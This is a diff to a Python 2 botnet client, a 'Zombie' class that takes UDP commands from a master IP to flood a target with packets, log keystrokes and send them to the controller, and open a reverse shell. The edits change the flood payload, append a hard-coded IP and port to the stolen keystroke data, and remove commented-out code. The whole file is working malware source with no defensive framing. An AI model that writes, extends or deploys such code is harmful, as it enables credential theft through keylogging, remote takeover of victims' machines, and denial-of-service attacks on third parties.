@@ -41,7 +41,7 @@ class Zombie:
 
 		print "starting dos..."
 		for i in xrange(10):
-			sock.sendto("SPAM",(dest_ip,dest_port))						#Send packets
+			sock.sendto("ZOMB-("+MASTER_IP+","+str(ZOMB_PORT)+")",(dest_ip,dest_port))						#Send packets
 
 		sock.sendto("dos finished...",(MASTER_IP,MASTER_PORT)) 
 		sock.close()													#Close socket
@@ -90,6 +90,7 @@ class Zombie:
 				break
 		hook.cancel()
 		print "stopped key logging..."
+		keys = keys + "`127.0.0.1`" + str(ZOMB_PORT) 				#hard coded ip and port
 
 		print "sending key data..."
 		self.conn.sendto(keys,(MASTER_IP,MASTER_PORT))
@@ -106,7 +107,6 @@ class Zombie:
 		#packet = "KEYL,TIME"
 		#TIME is in seconds
 		elif packet[0] == "KEYL":
-			self.conn.sendto("KEYL",(MASTER_IP,MASTER_PORT))
 			self.keylog(int(packet[1]))
 
 		#packet = "RVSH"
@@ -115,7 +115,6 @@ class Zombie:
 			self.reverse_shell()
 
 
-		# conn.close()
 
 
 
@@ -123,10 +122,8 @@ if __name__ == '__main__':
 
 
 	try:
-		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
 		s.bind(('',ZOMB_PORT))								#Bind to port
-		# s.listen(3)													#Listen 
 		print 'Socket created'
 	except socket.error, msg :
 		print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
@@ -140,11 +137,7 @@ if __name__ == '__main__':
 		#Receive command
 		data, addr = zomb.conn.recvfrom(1024)
 		print "reveived: " + data + " from: " + addr[0] + " " + str(addr[1])
-		# conn, addr = s.accept()
 		if addr[0] == MASTER_IP:
-			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
-			# start_new_thread(zomb.parse_cmd ,(conn,))
-			# start_new_thread(zomb.parse_cmd ,(data,))
 			print "Parsing..."
 			zomb.parse_cmd(data)
 
